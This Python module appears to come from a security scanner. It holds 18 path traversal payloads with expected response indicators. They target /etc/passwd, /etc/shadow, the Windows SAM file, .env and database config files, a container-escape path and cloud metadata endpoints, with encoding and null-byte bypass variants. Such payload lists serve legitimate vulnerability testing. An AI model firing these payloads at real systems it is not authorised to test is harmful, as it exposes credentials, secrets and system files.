"""Path traversal payload categories - COMPLETE COLLECTION."""

import urllib.parse
from typing import List, Dict, Any


class PathTraversalPayloads:
    """Complete collection of path traversal attack payloads (18 total)."""
    
    @staticmethod
    def get_basic_unix_payloads() -> List[Dict[str, Any]]:
        """Get basic Unix path traversal payloads."""
        return [
            {
                "payload": "../../../etc/passwd",
                "expected_indicators": ["root:x:", "daemon:", "nobody:"],
                "severity": "high",
                "description": "Unix password file access"
            },
            {
                "payload": "....//....//....//etc/shadow",
                "expected_indicators": ["root:", "shadow", "$6$"],
                "severity": "critical",
                "description": "Unix shadow file access with bypass"
            },
            {
                "payload": "/etc/passwd%00.txt",
                "expected_indicators": ["root:x:", "null byte"],
                "severity": "high",
                "description": "Null byte injection"
            },
            {
                "payload": "../../../../../../../proc/self/environ",
                "expected_indicators": ["PATH=", "HOME=", "USER="],
                "severity": "medium",
                "description": "Process environment access"
            },
        ]
    
    @staticmethod
    def get_windows_payloads() -> List[Dict[str, Any]]:
        """Get Windows path traversal payloads."""
        return [
            {
                "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "expected_indicators": ["localhost", "127.0.0.1"],
                "severity": "high",
                "description": "Windows hosts file access"
            },
            {
                "payload": "..\\..\\..\\windows\\system32\\config\\sam",
                "expected_indicators": ["sam", "security", "system"],
                "severity": "critical",
                "description": "Windows SAM file access"
            },
            {
                "payload": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
                "expected_indicators": ["[fonts]", "windows"],
                "severity": "medium",
                "description": "Windows ini file access"
            },
        ]
    
    @staticmethod
    def get_encoded_payloads() -> List[Dict[str, Any]]:
        """Get encoded path traversal payloads."""
        return [
            {
                "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "expected_indicators": ["root:x:", "encoded"],
                "severity": "high",
                "description": "URL encoded path traversal"
            },
            {
                "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "expected_indicators": ["root:x:", "double encoded"],
                "severity": "high",
                "description": "Double URL encoded traversal"
            },
        ]
    
    @staticmethod
    def get_application_specific_payloads() -> List[Dict[str, Any]]:
        """Get application-specific path traversal payloads."""
        return [
            {
                "payload": "../.env",
                "expected_indicators": ["API_KEY", "DATABASE_URL", "SECRET"],
                "severity": "critical",
                "description": "Environment file access"
            },
            {
                "payload": "../config/database.yml",
                "expected_indicators": ["database:", "password:", "production:"],
                "severity": "high",
                "description": "Database configuration access"
            },
            {
                "payload": "../../../app.py",
                "expected_indicators": ["import", "def ", "app ="],
                "severity": "medium",
                "description": "Python source code access"
            },
            {
                "payload": "../.git/config",
                "expected_indicators": ["[core]", "repositoryformatversion", "git"],
                "severity": "medium",
                "description": "Git configuration access"
            },
        ]
    
    @staticmethod
    def get_protocol_payloads() -> List[Dict[str, Any]]:
        """Get protocol-based path traversal payloads."""
        return [
            {
                "payload": "file:///etc/passwd",
                "expected_indicators": ["file://", "root:x:"],
                "severity": "high",
                "description": "File protocol traversal"
            },
        ]
    
    @staticmethod
    def get_cloud_metadata_payloads() -> List[Dict[str, Any]]:
        """Get cloud metadata access payloads."""
        return [
            {
                "payload": "http://169.254.169.254/latest/user-data",
                "expected_indicators": ["169.254.169.254", "user-data", "aws"],
                "severity": "high",
                "description": "AWS user data access"
            },
            {
                "payload": "http://metadata.google.internal/computeMetadata/v1/",
                "expected_indicators": ["metadata.google", "computeMetadata"],
                "severity": "high",
                "description": "GCP metadata access"
            },
        ]
    
    @staticmethod
    def get_container_specific_payloads() -> List[Dict[str, Any]]:
        """Get container-specific path traversal payloads."""
        return [
            {
                "payload": "../../../../../../../proc/1/root/etc/shadow",
                "expected_indicators": ["proc/1/root", "shadow"],
                "severity": "critical",
                "description": "Container escape to host shadow file"
            },
            {
                "payload": "/../../../.dockerenv",
                "expected_indicators": [".dockerenv", "container"],
                "severity": "medium",
                "description": "Docker environment detection"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 18 path traversal payloads."""
        payloads = []
        payloads.extend(PathTraversalPayloads.get_basic_unix_payloads())
        payloads.extend(PathTraversalPayloads.get_windows_payloads())
        payloads.extend(PathTraversalPayloads.get_encoded_payloads())
        payloads.extend(PathTraversalPayloads.get_application_specific_payloads())
        payloads.extend(PathTraversalPayloads.get_protocol_payloads())
        payloads.extend(PathTraversalPayloads.get_cloud_metadata_payloads())
        payloads.extend(PathTraversalPayloads.get_container_specific_payloads())
        return payloads